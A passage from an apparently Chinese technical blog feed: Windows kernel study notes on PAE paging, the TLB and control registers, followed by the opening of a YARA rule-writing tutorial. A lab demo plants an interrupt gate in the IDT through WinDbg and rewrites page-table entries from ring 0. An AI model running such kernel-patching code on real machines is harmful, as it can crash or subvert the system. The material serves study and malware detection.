class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>线性地址：<code>0x0012EF80</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !vtop 028801e0  0012ef80</span><br><span class="line">X86VtoP: Virt 000000000012ef80, pagedir 00000000028801e0</span><br><span class="line">X86VtoP: PAE PDPE 00000000028801e0 - 000000000da11801</span><br><span class="line">X86VtoP: PAE PDE 000000000da11000 - 0000000013b23867</span><br><span class="line">X86VtoP: PAE PTE 0000000013b23970 - 800000001c0e8867</span><br><span class="line">X86VtoP: PAE Mapped phys 000000001c0e8f80</span><br><span class="line">Virtual address 12ef80 translates to physical address 1c0e8f80.</span><br></pre></td></tr></table></figure><p>不能直接<code>!eq</code>，需要<code>!ed</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !vtop 028801e0  0012ef80</span><br><span class="line">X86VtoP: Virt 000000000012ef80, pagedir 00000000028801e0</span><br><span class="line">X86VtoP: PAE PDPE 00000000028801e0 - 000000000da11801</span><br><span class="line">X86VtoP: PAE PDE 000000000da11000 - 0000000013b23867</span><br><span class="line">X86VtoP: PAE PTE 0000000013b23970 - 800000001c0e8867</span><br><span class="line">X86VtoP: PAE Mapped phys 000000001c0e8f80</span><br><span class="line">Virtual address 12ef80 translates to physical address 1c0e8f80.</span><br><span class="line">kd&gt; !ed 13b23000 1c0e8867</span><br><span class="line">kd&gt; !ed 13b23004 80000000</span><br><span class="line">kd&gt; g</span><br></pre></td></tr></table></figure><p>挂载成功</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220924211956538.png"></p><h2 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span><span class="number">-9</span><span class="number">-9</span><span class="number">-12</span></span><br><span class="line">PDPTI-PDI-PTI-OFFSET</span><br><span class="line"></span><br><span class="line">公式：</span><br><span class="line">pPDE = <span class="number">0xc0600000</span> + (PDPTI*<span class="number">4</span>KB) + (PDI*<span class="number">8</span>)</span><br><span class="line">pPTE = <span class="number">0xc0000000</span> + (PDPTI*<span class="number">2</span>MB) + (PDI*<span class="number">4</span>KB) + (PTI*<span class="number">8</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="027-TLB"><a href="#027-TLB" class="headerlink" title="027.TLB"></a>027.TLB</h1><p>TLB（Translation Lookaside Buffer）</p><p>当程序访问一个线性地址，需要先查PDPT，然后查PDT，然后查页表PTT，最后才是访问物理页。这期间多次访问内存，效率非常低。于是TLB就被设计出来了。</p><p>TLB 是CPU内部的表，一个CPU有一张TLB表，用来缓存线性地址和物理地址的映射关系，以及属性和访问次数。</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220925121337378.png"></p><p>说明：</p><ol><li><p>ATTR（属性）：属性是PDPE PDE PTE三个属性AND起来的. 如果是10-10-12 就是PDE and PTE</p></li><li><p>不同的CPU 这个表的大小不一样.</p></li><li><p>只要Cr3变了，TLB立马刷新，一核一套TLB.</p></li></ol><p>操作系统的高2G映射基本不变，如果Cr3改了，TLB刷新 重建高2G以上很浪费。所以PDE和PTE中有个G标志位，如果G位为1刷新TLB时将不会刷新 PDE&#x2F;PTE的G位为1的页，当TLB满了，根据统计信息将不常用的地址废弃，最近最常用的保留.</p><h2 id="证明TLB存在"><a href="#证明TLB存在" class="headerlink" title="证明TLB存在"></a>证明TLB存在</h2><p>在R0给NULL挂一个物理页，并写入数据，然后修改NULL的物理页，然后读NULL，发现读取了之前写入的值，这证明第二次访问NULL的时候是从TLB中取的物理地址，证明了TLB的存在。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD TempVal = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Function()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">pushad</span><br><span class="line">pushfd</span><br><span class="line"><span class="comment">// 1.给NULL挂物理页（修改PTE，这里概率蓝屏）0x01234867(G=0) 0x01234967(G=1)</span></span><br><span class="line">mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x01234867</span></span><br><span class="line"><span class="comment">// 2.写NULL指针，生成TLB记录</span></span><br><span class="line">mov dword ptr ds:[<span class="number">0</span>],<span class="number">0x12345678</span></span><br><span class="line"><span class="comment">// 3.再次修改物理页</span></span><br><span class="line">mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x02345867</span></span><br><span class="line"><span class="comment">// 4.读NULL，发现读了之前赋的值，证明了TLB的存在</span></span><br><span class="line">mov eax,dword ptr ds:[<span class="number">0</span>]</span><br><span class="line">mov TempVal,eax</span><br><span class="line"></span><br><span class="line">popfd</span><br><span class="line">popad</span><br><span class="line">iretd</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;在IDT表构建中断门，请在windbg中执行下面的指令：\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;eq 8003f500 %04xee00`0008%04x\n&quot;</span>,(DWORD)R0Function&gt;&gt;<span class="number">16</span>,(DWORD)R0Function &amp; <span class="number">0x0000FFFF</span>);</span><br><span class="line">getchar();</span><br><span class="line">__asm <span class="keyword">int</span> <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08X\n&quot;</span>, TempVal);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220925123759825.png"></p><h1 id="028-控制寄存器"><a href="#028-控制寄存器" class="headerlink" title="028.控制寄存器"></a>028.控制寄存器</h1><p>控制寄存器用于控制和确定CPU的操作模式。有：<code>Cr0</code>，<code>Cr1</code>，<code>Cr2</code>，<code>Cr3</code>，<code>Cr4</code>，其中<code>Cr1</code> 保留<code>Cr3</code> 页目录表基址</p><h2 id="Cr0"><a href="#Cr0" class="headerlink" title="Cr0"></a>Cr0</h2><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220925121843125.png"></p><p>说明：</p><ol><li>PE：CR0的位0是启用保护（Protection Enable）标志。<ul><li>PE&#x3D;1保护模式  </li><li>PE&#x3D;0 实地址模式 这个标志仅开启段级保护，而并没有启用分页机制。</li><li>若要启用分页机制，那么PE和PG标志都要置位。</li></ul></li><li>PG：当设置该位时即开启了分页机制。在开启这个标志之前必须已经或者同时开启PE标志。</li></ol><blockquote><p>  PG&#x3D;0且PE&#x3D;0  处理器工作在实地址模式下<br>  PG&#x3D;0且PE&#x3D;1  处理器工作在没有开启分页机制的保护模式下<br>  PG&#x3D;1且PE&#x3D;0  在PE没有开启的情况下  无法开启PG<br>  PG&#x3D;1且PE&#x3D;1  处理器工作在开启了分页机制的保护模式下</p></blockquote><h2 id="Cr2"><a href="#Cr2" class="headerlink" title="Cr2"></a>Cr2</h2><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220925122123519.png"></p><p>当CPU访问某个无效页面时，会产生缺页异常，此时，CPU会将引起异常的线性地址存放在CR2中。</p><h2 id="Cr4"><a href="#Cr4" class="headerlink" title="Cr4"></a>Cr4</h2><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220925122137925.png"></p><p>PAE&#x3D;1 是2-9-9-12分页  PAE&#x3D;0 是10-10-12分页。</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220925122155565.png"></p><p>Windows保护模式就此告一段落，下来是驱动的内容…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;001-保护模式&quot;&gt;&lt;a href=&quot;#001-保护模式&quot; class=&quot;headerlink&quot; title=&quot;001.保护模式&quot;&gt;&lt;/a&gt;001.保护模式&lt;/h1&gt;&lt;p&gt;x86CPU三个模式：实模式， 保护模式，虚拟8086模式&lt;/p&gt;</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="Win32" scheme="https://ghostasky.github.io/tags/Win32/"/>
    
  </entry>
  
  <entry>
    <title>YARA规则</title>
    <link href="https://ghostasky.github.io/2022/08/13/2022-8-13-Yara/"/>
    <id>https://ghostasky.github.io/2022/08/13/2022-8-13-Yara/</id>
    <published>2022-08-12T16:00:00.000Z</published>
    <updated>2022-09-23T06:05:25.112Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="1-YARA简介"><a href="#1-YARA简介" class="headerlink" title="1.YARA简介"></a>1.YARA简介</h1><p>YARA 是一个旨在（但不限于）帮助恶意软件研究人员识别和分类恶意软件样本的开源工具。</p><p>YARA的每一条描述、规则都由一系列字符串和一个布尔型表达式构成，并阐述其逻辑。YARA规则可以与文件或在运行的进程，以帮助研究人员识别其是否属于某个已进行规则描述的恶意软件等。</p><blockquote><p>  项目地址：<a href="https://github.com/VirusTotal/yara%EF%BC%8C%EF%BC%88yara64.exe">https://github.com/VirusTotal/yara，（yara64.exe</a> ， yarac64.exe ）</p><p>  python：<a href="https://github.com/VirusTotal/yara-python">https://github.com/VirusTotal/yara-python</a></p><p>  官方文档：<a href="https://yara.readthedocs.io/">https://yara.readthedocs.io/</a></p></blockquote><h1 id="2-YARA示例"><a href="#2-YARA示例" class="headerlink" title="2.YARA示例"></a>2.YARA示例</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rule silent_banker : banker</span><br><span class="line">&#123;</span><br><span class="line">    meta:</span><br><span class="line">        description = <span class="string">&quot;This is just an example&quot;</span></span><br><span class="line">        thread_level = <span class="number">3</span></span><br><span class="line">        in_the_wild = <span class="literal">true</span></span><br><span class="line">    strings:</span><br><span class="line">        $a = &#123;<span class="number">6</span>A <span class="number">40</span> <span class="number">68</span> <span class="number">00</span> <span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">6</span>A <span class="number">14</span> <span class="number">8</span>D <span class="number">91</span>&#125;</span><br><span class="line">        $b = &#123;<span class="number">8</span>D <span class="number">4</span>D B0 <span class="number">2B</span> C1 <span class="number">83</span> C0 <span class="number">27</span> <span class="number">99</span> <span class="number">6</span>A <span class="number">4</span>E <span class="number">59</span> F7 F9&#125;</span><br><span class="line">        $c = <span class="string">&quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot;</span></span><br><span class="line">    condition:</span><br><span class="line">        $a <span class="keyword">or</span> $b <span class="keyword">or</span> $c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上规则：</p><ol><li>名为<code>rule silent_banker</code>的规则，其中<code>banker</code>是规则的tag字段(可以有多个tag)</li><li><code>meta</code>字段是规则的描述信息，比如可以有规则说明、作者信息、威胁等级、在野情况、文件MD5、来源等内容；</li><li><code>strings</code>是规则字段</li><li><code>condition</code>则是条件判断的字段</li></ol><h1 id="3-yara规则"><a href="#3-yara规则" class="headerlink" title="3.yara规则"></a>3.yara规则</h1><blockquote><p>  官方文档：<a href="https://yara.readthedocs.io/en/v4.2.3/writingrules.html">https://yara.readthedocs.io/en/v4.2.3/writingrules.html</a></p></blockquote><p>yara中的规则都以<code>rule</code>开头，后面跟着的是<code>identifier</code>（标识符），标识符和编程中的变量命名差不多，部分保留的关键字不能用作标识符：</p><table><thead><tr><th align="center"><strong>all</strong></th><th align="center"><strong>and</strong></th><th align="center"><strong>any</strong></th><th align="center"><strong>ascii</strong></th><th align="center"><strong>at</strong></th><th align="center"><strong>base64</strong></th><th align="center"><strong>base64wide</strong></th><th align="center"><strong>condition</strong></th></tr></thead><tbody><tr><td align="center"><strong>contains</strong></td><td align="center"><strong>endswith</strong></td><td align="center"><strong>entrypoint</strong></td><td align="center"><strong>false</strong></td><td align="center"><strong>filesize</strong></td><td align="center"><strong>for</strong></td><td align="center"><strong>fullword</strong></td><td align="center"><strong>global</strong></td></tr><tr><td align="center"><strong>import</strong></td><td align="center"><strong>icontains</strong></td><td align="center"><strong>iendswith</strong></td><td align="center"><strong>iequals</strong></td><td align="center"><strong>in</strong></td><td align="center"><strong>include</strong></td><td align="center"><strong>int16</strong></td><td align="center"><strong>int16be</strong></td></tr><tr><td align="center"><strong>int32</strong></td><td align="center"><strong>int32be</strong></td><td align="center"><strong>int8</strong></td><td align="center"><strong>int8be</strong></td><td align="center"><strong>istartswith</strong></td><td align="center"><strong>matches</strong></td><td align="center"><strong>meta</strong></td><td align="center"><strong>nocase</strong></td></tr><tr><td align="center"><strong>none</strong></td><td align="center"><strong>not</strong></td><td align="center"><strong>of</strong></td><td align="center"><strong>or</strong></td><td align="center"><strong>private</strong></td><td align="center"><strong>rule</strong></td><td align="center"><strong>startswith</strong></td><td align="center"><strong>strings</strong></td></tr><tr><td align="center"><strong>them</strong></td><td align="center"><strong>true</strong></td><td align="center"><strong>uint16</strong></td><td align="center"><strong>uint16be</strong></td><td align="center"><strong>uint32</strong></td><td align="center"><strong>uint32be</strong></td><td align="center"><strong>uint8</strong></td><td align="center"><strong>uint8be</strong></td></tr><tr><td align="center"><strong>wide</strong></td><td align="center"><strong>xor</strong></td><td align="center"><strong>defined</strong></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><p>strings的部分由<code>$</code>后跟一系列字母数字字符和下划线组成，strings可以以文本或十六进制形式定义，示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule ExampleRule</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $my_text_string = <span class="string">&quot;text here&quot;</span></span><br><span class="line">        $my_hex_string = &#123; E2 <span class="number">34</span> A1 C8 <span class="number">23</span> FB &#125;</span><br><span class="line">    condition:</span><br><span class="line">        $my_text_string <span class="keyword">or</span> $my_hex_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>文本使用引号括起来</li><li>十六进制使用大括号（只能是16进制</li></ol><h2 id="3-1-注释"><a href="#3-1-注释" class="headerlink" title="3.1 注释"></a>3.1 注释</h2><p>跟c语言一样，行注释和段注释都一样。</p><h2 id="3-2-Strings"><a href="#3-2-Strings" class="headerlink" title="3.2 Strings"></a>3.2 Strings</h2><h3 id="3-2-1-Hex"><a href="#3-2-1-Hex" class="headerlink" title="3.2.1 Hex"></a>3.2.1 Hex</h3><p>这里其实有三种，文本，十六进制，还有一种是正则。</p><p>十六进制可以使用占位符<code>?</code>，通配符使用<code>[]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$hex_string = &#123; E2 <span class="number">34</span> ?? C8 A? FB &#125;</span><br><span class="line">$hex_string = &#123; F4 <span class="number">23</span> [<span class="number">4</span><span class="number">-6</span>] <span class="number">62</span> B4 &#125;</span><br></pre></td></tr></table></figure><p>yara2.0之后可以使用无界跳转：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FE <span class="number">39</span> <span class="number">45</span> [<span class="number">10</span>-] <span class="number">89</span> <span class="number">00</span></span><br><span class="line">FE <span class="number">39</span> <span class="number">45</span> [-] <span class="number">89</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>还有一种给定部分的替换方案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$hex_string = &#123; F4 <span class="number">23</span> ( <span class="number">62</span> B4 | <span class="number">56</span> ) <span class="number">45</span> &#125;</span><br></pre></td></tr></table></figure><p>他会匹配：<code>F42362B445 or F4235645</code></p><h3 id="3-2-2-Text-strings"><a href="#3-2-2-Text-strings" class="headerlink" title="3.2.2 Text strings"></a>3.2.2 Text strings</h3><h4 id="不区分大小写：nocase"><a href="#不区分大小写：nocase" class="headerlink" title="不区分大小写：nocase"></a>不区分大小写：nocase</h4><p>不区分大小写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$text_string = <span class="string">&quot;foobar&quot;</span> nocase</span><br></pre></td></tr></table></figure><h4 id="宽字节：wide"><a href="#宽字节：wide" class="headerlink" title="宽字节：wide"></a>宽字节：wide</h4><p>如果字符串“Borland”的编码为每个字符两个字节（即B\x00o\x00r\x00l\x00a\x00n\x00d\x00），则以下规则将匹配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule WideCharTextExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $wide_string = <span class="string">&quot;Borland&quot;</span> wide</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $wide_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果要同时搜索ASCII和wide格式的字符串，可以将ASCII修饰符与wide结合使用，先后顺序无所谓：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$wide_and_ascii_string = <span class="string">&quot;Borland&quot;</span> wide ascii</span><br></pre></td></tr></table></figure><blockquote><p>  默认情况下Text就是ascii的。</p></blockquote><h4 id="XOR：xor"><a href="#XOR：xor" class="headerlink" title="XOR：xor"></a>XOR：xor</h4><p>以下规则将搜索应用于字符串“This program cannot”（包括明文字符串）的每个单字节XOR：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule XorExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $xor_string = <span class="string">&quot;This program cannot&quot;</span> <span class="keyword">xor</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $xor_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rule XorExample2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $xor_string_00 = <span class="string">&quot;This program cannot&quot;</span></span><br><span class="line">        $xor_string_01 = <span class="string">&quot;Uihr!qsnfs`l!b`oonu&quot;</span></span><br><span class="line">        $xor_string_02 = <span class="string">&quot;Vjkq\&quot;rpmepco\&quot;acllmv&quot;</span></span><br><span class="line">        <span class="comment">// Repeat for every single byte XOR</span></span><br><span class="line">    condition:</span><br><span class="line">        any of them</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样可以结合<code>wide</code>和<code>ascii</code>使用</p><h4 id="base64：base64"><a href="#base64：base64" class="headerlink" title="base64：base64"></a>base64：base64</h4><p>以下规则将搜索字符串“此程序无法”的三个base64排列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rule Base64Example1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;This program cannot&quot;</span> base64</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VGhpcyBwcm9ncmFtIGNhbm5vd</span></span><br><span class="line"><span class="comment">RoaXMgcHJvZ3JhbSBjYW5ub3</span></span><br><span class="line"><span class="comment">UaGlzIHByb2dyYW0gY2Fubm90</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>base64wide修改器的工作方式与base64修改器类似，但base64调整器的结果将转换为wide。</p><p>base64和base64宽修饰符还支持自定义字母表，当然字母表长度必须为64</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">&quot;This program cannot&quot;</span> base64(<span class="string">&quot;!@#$%^&amp;*()&#123;&#125;[].,|ABCDEFGHIJ\x09LMNOPQRSTUVWXYZabcdefghijklmnopqrstu&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Searching-for-full-words：fullword"><a href="#Searching-for-full-words：fullword" class="headerlink" title="Searching for full words：fullword"></a>Searching for full words：fullword</h4><p>比如说匹配domain的话，<code>www.mydomain.com</code>这样不会被匹配，但：<code>www.my-domain.com and www.domain.com</code>这样会被匹配</p><h3 id="3-2-3-正则"><a href="#3-2-3-正则" class="headerlink" title="3.2.3 正则"></a>3.2.3 正则</h3><p>正则同样可以后面跟nocase，ascii等修饰符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rule RegExpExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $re1 = /md5: [<span class="number">0</span><span class="number">-9</span>a-fA-F]&#123;<span class="number">32</span>&#125;/</span><br><span class="line">        $re2 = /state: (on|off)/</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $re1 <span class="keyword">and</span> $re2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以在后面结束的斜杠后面加i或者s，用于指定正则表达式不区分大小写。</p><p><code>.</code>可以匹配新一行的字符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rule RegExpExample2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $re1 = /foo/i    <span class="comment">// This regexp is case-insentitive</span></span><br><span class="line">        $re2 = /bar./s   <span class="comment">// In this regexp the dot matches everything, including new-line</span></span><br><span class="line">        $re3 = /baz./is  <span class="comment">// Both modifiers can be used together</span></span><br><span class="line">    condition:</span><br><span class="line">        any of them</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>YARA正则表达式识别以下元字符：</p><table><thead><tr><th align="center"><code>\</code></th><th align="center">引用下一个元字符</th></tr></thead><tbody><tr><td align="center"><strong><code>^</code></strong></td><td align="center"><strong>匹配文件的开头，或在用作左括号后的第一个字符时，对字符类求反</strong></td></tr><tr><td align="center"><strong><code>$</code></strong></td><td align="center"><strong>匹配文件的结尾</strong></td></tr><tr><td align="center"><strong><code>.</code></strong></td><td align="center"><strong>匹配除换行符以外的任何单个字符</strong></td></tr><tr><td align="center">**&#96;</td><td align="center">&#96;**</td></tr><tr><td align="center"><strong><code>()</code></strong></td><td align="center"><strong>Grouping</strong></td></tr><tr><td align="center"><strong><code>[]</code></strong></td><td align="center"><strong>Bracketed character class</strong></td></tr></tbody></table><p>以下量词也可以识别：</p><table><thead><tr><th align="center"><strong><code>*</code></strong></th><th align="center"><strong>Match 0 or more times</strong></th></tr></thead><tbody><tr><td align="center"><strong><code>+</code></strong></td><td align="center"><strong>Match 1 or more times</strong></td></tr><tr><td align="center"><strong><code>?</code></strong></td><td align="center"><strong>Match 0 or 1 times</strong></td></tr><tr><td align="center"><strong><code>&#123;n&#125;</code></strong></td><td align="center"><strong>Match exactly n times（精确匹配）</strong></td></tr><tr><td align="center"><strong><code>&#123;n,&#125;</code></strong></td><td align="center"><strong>Match at least n times（至少匹配n次）</strong></td></tr><tr><td align="center"><strong><code>&#123;,m&#125;</code></strong></td><td align="center"><strong>Match at most m times（最多匹配n次）</strong></td></tr><tr><td align="center"><strong><code>&#123;n,m&#125;</code></strong></td><td align="center"><strong>Match n to m times</strong></td></tr></tbody></table><p>以下转义字符可识别：</p><table><thead><tr><th align="center"><strong><code>\t</code></strong></th><th align="center"><strong>Tab (HT, TAB)</strong></th></tr></thead><tbody><tr><td align="center"><strong><code>\n</code></strong></td><td align="center"><strong>New line (LF, NL)</strong></td></tr><tr><td align="center"><strong><code>\r</code></strong></td><td align="center"><strong>Return (CR)</strong></td></tr><tr><td align="center"><strong><code>\f</code></strong></td><td align="center"><strong>Form feed (FF)换页</strong></td></tr><tr><td align="center"><strong><code>\a</code></strong></td><td align="center"><strong>Alarm bell</strong></td></tr><tr><td align="center"><strong><code>\xNN</code></strong></td><td align="center"><strong>序号为给定十六进制数的字符</strong></td></tr></tbody></table><p>公认字符类：</p><table><thead><tr><th><code>\w</code></th><th>匹配单词字符 (alphanumeric plus “_”)</th></tr></thead><tbody><tr><td><code>\W</code></td><td>匹配非单词字符</td></tr><tr><td><code>\s</code></td><td>匹配空白字符</td></tr><tr><td><code>\S</code></td><td>Match a non-whitespace character</td></tr><tr><td><code>\d</code></td><td>匹配十进制数字字符</td></tr><tr><td><code>\D</code></td><td>Match a non-digit character</td></tr></tbody></table><h2 id="3-3-Conditions"><a href="#3-3-Conditions" class="headerlink" title="3.3 Conditions"></a>3.3 Conditions</h2><p>conditions就是布尔表达式，and or not ，关系运算符，算数运算符，位运算等。</p><p>整数的长度始终为64位，使用位运算符时（例如，~0x01不是0xFE，而是0xFFFFFFFFFE）。</p><h3 id="3-3-1-Counting-strings"><a href="#3-3-1-Counting-strings" class="headerlink" title="3.3.1 Counting strings"></a>3.3.1 Counting strings</h3><p>如题，就是计算string的次数，这里使用的是井号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rule CountExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="meta">#a == 6 and #b &gt; 10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>yara4.2.0后，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 